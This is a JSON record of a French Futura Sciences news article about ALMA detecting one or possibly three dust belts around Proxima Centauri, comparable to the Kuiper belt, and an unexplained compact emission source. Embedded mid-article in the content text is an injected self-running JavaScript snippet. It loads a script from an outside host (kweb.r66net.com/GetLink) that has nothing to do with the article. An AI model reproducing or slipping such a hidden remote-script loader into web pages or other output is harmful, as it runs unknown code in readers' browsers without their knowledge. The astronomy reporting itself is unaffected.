{"title": "Proxima du Centaure : d'etranges anneaux de poussiere decouverts", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-11-06", "content": "Proxima du Centaure, l'etoile la plus proche de notre Systeme solaire, abriterait plusieurs ceintures de poussiere, en plus de l'exoterre decouverte il y a un an. Leur presence suggere que la naine rouge possede un systeme planetaire complexe. Ce qu'il faut retenir L'etoile la plus proche de notre Soleil s'appelle Proxima du Centaure et se situe a seulement 4,2 annees-lumiere de nous. Des chercheurs ont decouvert la presence d'une ceinture de poussiere autour de cette etoile. Celle-ci est comparable a la ceinture de Kuiper dans notre Systeme solaire. Les observations realisees avec Alma suggerent aussi la presence de deux autres ceintures de poussiere, mais cela reste a confirmer. En route vers Proxima b, l'exoplanete habitable la plus proche de nous                       Quittez le Systeme solaire pour rejoindre Proxima b, l'exoplanete habitable decouverte autour de Proxima du Centaure, l'etoile la plus proche du Soleil.                                       L' etoile  la plus proche de notre  Systeme solaire  n'a pas fini de surprendre les astronomes. Il y a un peu plus d'un an, les Terriens apprenaient qu'une planete 1,3 fois plus massive que la leur, appelee Proxima b, gravite en 11 jours dans la zone temperee de  Proxima du Centaure . La  naine rouge  (0,12  masse  solaire), qui n'est pas visible a l' oeil  nu, abrite donc un monde a seulement 4 millions de kilometres de sa surface qui, s'il renferme de l'eau, est potentiellement habitable. Une bonne nouvelle pour la recherche d'exoterres et de la vie ailleurs (toutefois, la possibilite de la vie sur une planete proche d'une  naine rouge  est tres discutee), d'autant que  Proxima b  est a notre portee a l'echelle de la  Galaxie , a seulement 4,2  annees-lumiere , soit environ 40.000 milliards de kilometres ! Voir aussi : Proxima b peut-elle etre une exoterre habitable ? Cette planete pourrait ne pas etre la seule dans le systeme de Proxima. Curieux insatiables, comme toujours, des astronomes ont recemment decouvert, avec Alma ( Atacama Large Millimeter/Submillimeter Array ), le grand reseau de  telescopes  installe dans l'Atacama, au Chili, que la naine rouge agee d'environ 5 milliards d'annees possede une, voire trois ceintures de poussiere. Survolez en video le systeme de Proxima du Centaure, situe a seulement 40.000 milliards de kilometresde notre Soleil. Un anneau de poussiere dense a ete identifie par Alma, entre 150 et 600 millions de kilometres de l'etoile. Une surdensite de matiere a ete observee sur le bord interne de la ceinture. L' exoterre Proxima b  orbite dans la zone habitable de la naine rouge, a quelque 4 millions de kilometres de sa surface. (c) M. Kornmesser, ESO Une ceinture de Kuiper dans le systeme de Proxima Le principal anneau de poussiere que l'equipe a mis en evidence rappelle, sur le  plan de la masse  et de la temperature, notre ceinture de Kuiper -- cette derniere se situe a 30  unites astronomiques  (UA) du  Soleil  (30 fois la distance Terre-Soleil) et s'etend jusqu'a 55 UA. La ceinture que les chercheurs ont decouverte se trouve entre 1 et 4 UA de Proxima (entre 150 et 600 millions de kilometres). La masse de l'ensemble est estimee a environ un centieme de celle de la  Terre  et sa temperature est de -230 degC. Comme la notre, cette ceinture se compose d'un melange de  matiere  residuelle de la formation des planetes, agglomerats de toutes tailles de roches et de glaces, qui vont des grains de moins d'un millimetre jusqu'aux objets plus grossiers de plusieurs kilometres...  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Une planete monstre decouverte pres d'une etoile naine Mais ce n'est pas tout. L'equipe emmenee par Guillem Anglada, de l' Instituto de Astrofisica de Andalucia , rapporte dans son  article  a paraitre dans  The Astrophysical Journals Letters  qu'il pourrait exister deux autres ceintures de poussiere autour de  Proxima du Centaure . Des observations complementaires sont cependant necessaires pour confirmer ou infirmer leur presence. L'une d'elles, plus froide encore que la premiere (-260 degC), serait 10 fois plus eloignee. L'autre, confinee relativement pres de l'etoile, serait plus chaude. << Ce resultat permet d'envisager l'existence, autour de Proxima du Centaure, d'un systeme planetaire complexe, fruit de multiples interactions ayant abouti a la formation d'une ceinture de poussiere , explique l'auteur principal.  Une etude plus approfondie devrait reveler les localisations de planetes non identifiees a ce jour >> . Une source d'emission compacte Les chercheurs ont aussi detecte une source d' emission  compacte dans la direction du bord interne de la premiere ceinture de poussiere identifiee. La nature de celle-ci n'est pas encore connue et il vaut mieux rester prudent dans son interpretation. Il pourrait tres bien s'agir d'un objet lointain, etranger au systeme de Proxima, comme par exemple une galaxie situee dans la meme perspective. Autrement, si cette source bouge en meme temps que la  naine rouge , les astronomes emettent alors l'hypothese qu'il puisse s'agir d'anneaux ceinturant une  planete geante , ou encore d'un  nuage  de debris. Nous en saurons plus bientot.  << Ce que nous observons aujourd'hui constitue un simple amuse-bouche compare a ce qui nous attend ! >>,  s'enthousiasme Pedro Amada, coauteur de ces recherches. ", "theme": "sciences"}